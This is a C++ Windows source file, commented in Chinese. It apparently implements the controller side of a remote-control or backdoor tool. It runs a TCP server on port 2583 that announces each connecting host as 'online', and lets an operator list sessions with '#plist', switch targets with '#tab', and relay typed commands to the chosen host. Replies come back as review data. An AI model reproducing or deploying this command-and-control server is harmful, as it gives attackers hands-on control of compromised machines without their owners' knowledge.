#include <stdio.h>
#include <Winsock2.h> //windows socket的头文件

#include <iostream>

#include "compack.h"
#pragma comment( lib, "ws2_32.lib" )// 链接Winsock2.h的静态库文件

using namespace std;

string allhistory = "";
string nowhost = "127.0.0.1";
 
struct threadSockData {
	SOCKET*sock;
	SOCKADDR_IN addr;
};

DWORD WINAPI SevThread(LPVOID cuth) {
	threadSockData *cuthdata =(threadSockData*) cuth;
	char sendBuf[50];
	sprintf(sendBuf, "%s", inet_ntoa(cuthdata->addr.sin_addr));//inet_ntoa网络地址转换转点分十进制的字符串指针	
	
	char linebuffer[255];
	sprintf(linebuffer,"上线！IP:%s\n", sendBuf);

	teleprintf(linebuffer);
	  
	allhistory += "line :";
	allhistory += 	sendBuf;
	allhistory += "\n";

	char headofCmd[50];
	sprintf(headofCmd, "%s>", sendBuf);
	while (1) {
		//	
		if (strcmp(sendBuf, nowhost.c_str()) != 0) {
			Sleep(100);
			continue;
		}


		teleprintf(headofCmd);

		string comb = "";
		telegetline(comb);


		if (comb == "#plist") {
			teleprintf(allhistory.c_str());
			continue;
		}
		else if (comb == "#tab") {


			teleprintf("输入要切换的IP:");
			string combip = "";
			telegetline( combip);
			nowhost = combip;
			continue;
		}

		if (ReleData(comb, cuthdata->sock) == -1) {
			continue;
		}
		//send(sockConn, comb.c_str(), comb.length(), 0);
		MESSAGEDATA locdata;

		int ret = recv(*cuthdata->sock, (char*)&locdata, sizeof(MESSAGEDATA), 0);

		if (ret == SOCKET_ERROR || ret == 0) {
			teleprintf("连接中断\n");
			break;
		}
		if (locdata.uId == DATA_REVIEW) {
			string nowDataEx = locdata.data;
			nowDataEx += "\n";

			teleprintf(nowDataEx.c_str());
		}
	}
	closesocket(*cuthdata->sock);
	allhistory += "lineout :";
	allhistory += sendBuf;
	allhistory += "\n";

	nowhost = "127.0.0.1";
	Sleep(2000);//2000毫秒
	delete cuthdata->sock;
	delete cuthdata;
	return 0;
}

DWORD WINAPI FakeThread(LPVOID  lp){
		char sendBuf[255];
		sprintf(sendBuf, "127.0.0.1");//inet_ntoa网络地址转换转点分十进制的字符串指针	
		allhistory += "line :";
		allhistory += sendBuf;
		allhistory += "\n";
		while (1) {
			//	
			if (strcmp(sendBuf, nowhost.c_str()) != 0) {
				Sleep(100);
				continue;
			}

			char linebuffer[255];

			sprintf(linebuffer, "%s>", sendBuf);
			teleprintf(linebuffer);

			string comb = "";
			telegetline(comb);

			//MessageBoxA(0,comb.c_str(),"",0);

			if (comb == "#plist") {
				teleprintf(allhistory.c_str());
				continue;
			}
			else if (comb == "#tab") {

				//MessageBox(0,L"",L"",0);
				teleprintf("输入要切换的IP:");
				string combip = "";
				telegetline( combip);
				nowhost = combip;
				continue;
			}


		}
		//closesocket(*cuthdata->sock);
		allhistory += "lineout :";
		allhistory += sendBuf;
		allhistory += "\n";
		Sleep(2000);//2000毫秒
	//	delete cuthdata->sock;
		//delete cuthdata;
		return 0;
}
using namespace std;
int main(){
	//初始化winsocket	
	CreateThread(0, 0, AdminLogin, 0, 0, 0);
	WORD wVersionRequested;	
	WSADATA wsaData;
	int err; 	
	wVersionRequested = MAKEWORD( 1, 1 );//第一个参数为低位字节；第二个参数为高位字节 	
	err = WSAStartup( wVersionRequested, &wsaData );//对winsock DLL（动态链接库文件）进行初始化，协商Winsock的版本支持，并分配必要的资源。	
	if ( err != 0 )	{		return 0;	} 
	if ( LOBYTE( wsaData.wVersion ) != 1 ||HIBYTE( wsaData.wVersion ) != 1 )//LOBYTE（）取得16进制数最低位；HIBYTE（）取得16进制数最高（最左边）那个字节的内容		
	{		WSACleanup( );		return 0;	} 
	SOCKET sockSrv=socket(AF_INET,SOCK_STREAM,0);//创建socket。AF_INET表示在Internet中通信；SOCK_STREAM表示socket是流套接字，对应tcp；0指定网络协议为TCP/IP
	SOCKADDR_IN addrSrv; 
	addrSrv.sin_addr.S_un.S_addr=htonl(INADDR_ANY);	//htonl用来将主机字节顺序转换为网络字节顺序(to network long)	//INADDR_ANY就是指定地址为0.0.0.0的地址,	//表示不确定地址,或“任意地址”。”
	addrSrv.sin_family=AF_INET; 	
	addrSrv.sin_port=htons(2583);//htons用来将主机字节顺序转换为网络字节顺序(to network short)
	
	bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));//将本地地址绑定到所创建的socket上，以使在网络上标识该socket 	
	listen(sockSrv,5);//socket监听，准备接受连接请求。 
	SOCKADDR_IN addrClient;	
	int len=sizeof(SOCKADDR); 	
	CreateThread(0, 0, FakeThread, 0, 0, 0);
	while (1) {
		//teleprintf("等待链接\n");
		SOCKET* sockConn = (SOCKET*)malloc(sizeof(SOCKET));
		*sockConn = accept(sockSrv, (SOCKADDR*)&addrClient, &len);//为一个连接请求提供服务。addrClient包含了发出连接请求的客户机IP地址信息；返回的新socket描述服务器与该客户机的连接 
		threadSockData* datath=(threadSockData*)malloc(sizeof(threadSockData));
		datath->addr = addrClient;
		datath->sock = sockConn;

		CreateThread(0, 0, SevThread, datath, 0, 0);
		
		
	}
	WSACleanup();
	return 0;
}